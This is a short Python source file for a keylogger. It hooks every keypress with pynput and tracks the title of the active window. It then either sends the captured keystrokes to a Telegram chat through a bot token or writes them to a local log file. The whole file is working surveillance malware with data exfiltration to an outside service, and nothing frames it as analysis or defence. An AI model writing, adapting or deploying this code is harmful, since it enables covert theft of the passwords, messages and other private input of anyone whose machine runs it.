from pynput.keyboard import Key, Listener
from telepot import Bot
import sys, subprocess
import time
import logging


if sys.platform == 'win32':
    import win32gui #This going to happen if your system is windows x84 or x64 whatever is going to work for both
    

#bot = Bot('token') #Only if you want to send all log to telegram otherwise keep commented
list_windows = []
keyboard = []
logging.basicConfig(filename='where_u_want_to_save_it.log', level=logging.INFO, format='%(asctime)s:%(levelname)s:%(message)s')

def win_windows(): #Obtain active window
    window = win32gui
    win_result = window.GetWindowText(window.GetForegroundWindow())
    return win_result


def on_press_send_telegram(Key):
    global list_windows, keyboard

    if sys.platform == 'linux': #Obtain active window from command-line
        window = subprocess.check_output("xprop -id $(xprop -root _NET_ACTIVE_WINDOW | cut -d ' ' -f 5) WM_NAME", shell=True) #get output
    elif sys.platform == 'win32':
        window = win_windows()

    keyboard.append(str(Key)) #Convert and add each key to the list

    try:
        if window != list_windows[-1]:
            try:
                bot.sendMessage(chat_id='chat_id', text=keyboard)
                keyboard.clear()
            except:
                time.sleep(60) #if happen any problem with telegram's API, this will happen: time.sleep going to wait for 60s and then 'listen' function will initialize again.
                listen()
    except:
        pass

    if window in list_windows:
        pass
    else:
        list_windows.append(window)


def on_press_save_local(Key): #store data locally
    logging.info(str(Key))


def listen():
        
    with Listener(on_press_send_telegram) as listener: # choice which function do you want to use for save you data basically
        listener.join()

listen()
